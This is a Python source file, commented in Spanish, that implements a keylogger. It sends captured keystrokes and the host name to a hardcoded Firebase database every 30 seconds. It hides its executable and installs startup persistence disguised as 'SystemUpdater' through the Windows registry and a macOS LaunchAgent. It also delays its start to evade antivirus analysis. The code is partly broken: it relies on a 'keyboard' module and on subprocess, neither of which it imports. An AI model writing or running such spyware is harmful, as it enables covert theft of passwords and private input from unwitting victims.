import pynput.keyboard
import threading
import datetime
import os
import sys
import time
import random
import string
import json
import platform

# --- DETECCIÓN DEL SISTEMA OPERATIVO ---
IS_WINDOWS = platform.system() == 'Windows'
IS_MACOS = platform.system() == 'Darwin'

# --- CONFIGURACIÓN DE FIREBASE ---
try:
    import firebase_admin
    from firebase_admin import credentials, db
    import sys
    import os

    def resource_path(relative_path):
        """ Obtiene la ruta absoluta al recurso, funciona para desarrollo y para PyInstaller """
        try:
            # PyInstaller crea una carpeta temporal y almacena la ruta en _MEIPASS
            base_path = sys._MEIPASS
        except Exception:
            base_path = os.path.abspath(".")

        return os.path.join(base_path, relative_path)

    # Usamos la nueva función para encontrar el archivo
    cred_path = resource_path("gold.json")
    cred = credentials.Certificate(cred_path)
    firebase_admin.initialize_app(cred, {
        'databaseURL': 'https://gold-51f84-default-rtdb.europe-west1.firebasedatabase.app/'
    })
    FIREBASE_ENABLED = True
    print("Firebase inicializado correctamente.")
except Exception as e:
    print(f"Error al inicializar Firebase: {e}")
    FIREBASE_ENABLED = False

# --- CLASES MODIFICADAS PARA FIREBASE ---

class RealtimeDataSender:
    def __init__(self):
        if FIREBASE_ENABLED:
            self.ref = db.reference('/')
        else:
            self.ref = None

    def send_keylog_data(self, keystrokes):
        if not self.ref:
            return
        try:
            keylogs_ref = self.ref.child('keylogs')
            new_log_ref = keylogs_ref.push()
            new_log_ref.set({
                'keystrokes': keystrokes,
                'timestamp': datetime.datetime.now().isoformat(),
                'computer_name': os.environ.get('COMPUTERNAME', os.environ.get('HOSTNAME', 'Unknown'))
            })
        except Exception as e:
            print(f"Error al enviar keylog a Firebase: {e}")

    def send_browser_data(self, data):
        if not self.ref:
            return
        try:
            browser_ref = self.ref.child('browser_data')
            new_log_ref = browser_ref.push()
            new_log_ref.set({
                'data': data,
                'timestamp': datetime.datetime.now().isoformat(),
                'computer_name': os.environ.get('COMPUTERNAME', os.environ.get('HOSTNAME', 'Unknown'))
            })
        except Exception as e:
            print(f"Error al enviar datos de navegador a Firebase: {e}")

# --- CLASES PRINCIPALES ---

class Keylogger:
    def __init__(self, realtime_sender):
        self.log = ""
        self.realtime_sender = realtime_sender

    def callback(self, event):
        # event.name es el nombre de la tecla (ej: 'a', 'space', 'enter')
        if event.event_type == keyboard.KEY_DOWN:
            try:
                self.log += event.name
            except AttributeError:
                self.log += f' [{event.name}] '
            except Exception as e:
                print(f"Error en callback de keylogger: {e}")

    def send_data(self):
        if self.log:
            self.realtime_sender.send_keylog_data(self.log)
            self.log = ""
        # Envía datos cada 30 segundos
        timer = threading.Timer(30, self.send_data)
        timer.daemon = True
        timer.start()

    def start(self):
        # keyboard.hook es más robusto que pynput.keyboard.Listener
        keyboard.hook(self.callback)
        print("Keylogger con 'keyboard' iniciado.")
        keyboard.wait() # Mantiene el script corriendo

class StealthAndPersistence:
    @staticmethod
    def hide_file():
        try:
            if IS_WINDOWS:
                # sys.executable apunta al .exe en ejecución
                os.system(f'attrib +h "{sys.executable}"')
            elif IS_MACOS:
                subprocess.run(['chflags', 'hidden', sys.executable], check=True)
        except Exception as e:
            print(f"Error al ocultar archivo: {e}")

    @staticmethod
    def add_to_startup():
        try:
            if IS_WINDOWS:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                with winreg.OpenKey(key, key_path, 0, winreg.KEY_WRITE) as registry_key:
                    winreg.SetValueEx(registry_key, "SystemUpdater", 0, winreg.REG_SZ, sys.executable)
            elif IS_MACOS:
                # Implementación para macOS (LaunchAgents)
                script_path = os.path.abspath(sys.argv[0])
                launch_agent_path = os.path.expanduser('~/Library/LaunchAgents/com.systemupdater.plist')
                plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.systemupdater</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/bin/python3</string>
        <string>{script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>"""
                with open(launch_agent_path, 'w') as f:
                    f.write(plist_content)
                subprocess.run(['launchctl', 'load', launch_agent_path], check=True)
        except Exception as e:
            print(f"Error al añadir al inicio: {e}")

class AntivirusEvasion:
    @staticmethod
    def delay_execution():
        # Retrasa la ejecución entre 1 y 3 minutos para evadir análisis dinámicos
        time.sleep(random.randint(60, 180))

# --- PROGRAMA PRINCIPAL ---

class MainProgram:
    def __init__(self):
        self.realtime_sender = RealtimeDataSender()
        self.keylogger = Keylogger(self.realtime_sender)

    def initialize(self):
        StealthAndPersistence.hide_file()
        StealthAndPersistence.add_to_startup()
        AntivirusEvasion.delay_execution()
        return True

    def run(self):
        if not self.initialize():
            return
        keylogger_thread = threading.Thread(target=self.keylogger.start)
        keylogger_thread.daemon = True
        keylogger_thread.start()
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            pass

if __name__ == "__main__":
    program = MainProgram()
    program.run()
